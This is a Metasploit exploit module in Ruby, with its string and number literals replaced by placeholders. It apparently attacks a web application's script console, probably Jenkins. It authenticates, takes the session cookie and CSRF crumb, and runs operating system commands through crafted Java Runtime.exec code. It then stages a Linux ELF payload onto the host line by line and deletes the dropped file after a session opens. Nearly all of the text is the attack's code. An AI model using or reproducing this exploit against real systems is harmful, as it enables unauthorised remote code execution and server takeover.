require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: CmdStager def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > { <str> = > <str> , } , <str> = > [ [ <str> , <str> ] ] , <str> = > <str> , <str> = > [ [ <str> , { <str> = > [ ARCH_X86_64 , ARCH_X86 ] , <str> = > <str> , <str> = > [ <str> , <str> ] } ] , [ <str> , { <str> = > ARCH_X86 , <str> = > <str> } ] , [ <str> , { <str> = > ARCH_CMD , <str> = > <str> , <str> = > { <str> = > <str> } } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def check uri = target_uri uri . path = normalize_uri ( uri . path ) uri . path << <str> if uri . path [ - <int> , <int> ] != <str> res = send_request_cgi ( { <str> = > <str> uri . path <str> } ) if res and res . headers . include? ( <str> ) return Exploit :: CheckCode :: Detected else return Exploit :: CheckCode :: Safe end end def on_new_session ( client ) if not @to_delete . nil? print_warning ( <str> @to_delete <str> ) execute_command ( <str> @to_delete <str> ) end end def http_send_command ( cmd , opts = { } ) request_parameters = { <str> = > <str> , <str> = > normalize_uri ( @uri . path , <str> ) , <str> = > { <str> = > java_craft_runtime_exec ( cmd ) , <str> = > <str> } } request_parameters [ <str> ] = @cookie if @cookie != nil request_parameters [ <str> ] [ <str> ] = @crumb if @crumb != nil res = send_request_cgi ( request_parameters ) if not ( res and res . code == <int> ) fail_with ( Failure :: Unknown , <str> ) end end def java_craft_runtime_exec ( cmd ) decoder = Rex :: Text . rand_text_alpha ( <int> , <int> ) decoded_bytes = Rex :: Text . rand_text_alpha ( <int> , <int> ) cmd_array = Rex :: Text . rand_text_alpha ( <int> , <int> ) jcode = <str> decoder <str> jcode << <str> decoded_bytes <str> decoder <str> Rex :: Text . encode_base64 ( cmd ) <str> jcode << <str> cmd_array <str> if target [ <str> ] == <str> jcode << <str> cmd_array <str> jcode << <str> cmd_array <str> else jcode << <str> cmd_array <str> jcode << <str> cmd_array <str> end jcode << <str> cmd_array <str> decoded_bytes <str> jcode << <str> cmd_array <str> jcode end def execute_command ( cmd , opts = { } ) vprint_status ( <str> cmd <str> ) http_send_command ( <str> cmd <str> ) end def linux_stager cmds = <str> exe = Msf :: Util :: EXE . to_linux_x86_elf ( framework , payload . raw ) base64 = Rex :: Text . encode_base64 ( exe ) base64 . gsub! ( <str> , <str> ) file = rand_text_alphanumeric ( <int> + rand ( <int> ) ) execute_command ( <str> file <str> ) cmds . gsub! ( <str> , <str> + file + <str> ) base64 . each_line do | line | line . chomp! cmd = cmds cmd . gsub! ( <str> , line ) execute_command ( cmds ) end execute_command ( <str> file <str> file <str> ) execute_command ( <str> file <str> ) execute_command ( <str> file <str> ) execute_command ( <str> file <str> ) @to_delete = <str> file <str> end def exploit @uri = target_uri @uri . path = normalize_uri ( @uri . path ) @uri . path << <str> if @uri . path [ - <int> , <int> ] != <str> print_status ( <str> ) res = send_request_cgi ( { <str> = > <str> @uri . path <str> } ) fail_with ( Failure :: Unknown , <str> ) if not res @cookie = nil @crumb = nil if res . code != <int> print_status ( <str> ) res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( @uri . path , <str> ) , <str> = > { <str> = > Rex :: Text . uri_encode ( datastore [ <str> ] , <str> ) , <str> = > Rex :: Text . uri_encode ( datastore [ <str> ] , <str> ) , <str> = > <str> } } ) if not ( res and res . code == <int> ) or res . headers [ <str> ] =~ <str> fail_with ( Failure :: NoAccess , <str> ) end sessionid = <str> << res . get_cookies . split ( <str> ) [ <int> ] . split ( <str> ) [ <int> ] @cookie = <str> sessionid <str> res = send_request_cgi ( { <str> = > <str> @uri . path <str> , <str> = > @cookie } ) fail_with ( Failure :: UnexpectedReply , <str> ) unless res and res . code == <int> else print_status ( <str> ) end if ( res . body =~ <str> ) print_status ( <str> $1 <str> ) @crumb = $1 end case target [ <str> ] when <str> print_status ( <str> rhost <str> rport <str> ) execute_cmdstager ( { <str> = > <int> } ) when <str> print_status ( <str> rhost <str> rport <str> ) http_send_command ( <str> payload . encoded <str> ) when <str> print_status ( <str> rhost <str> rport <str> ) linux_stager end handler end end 
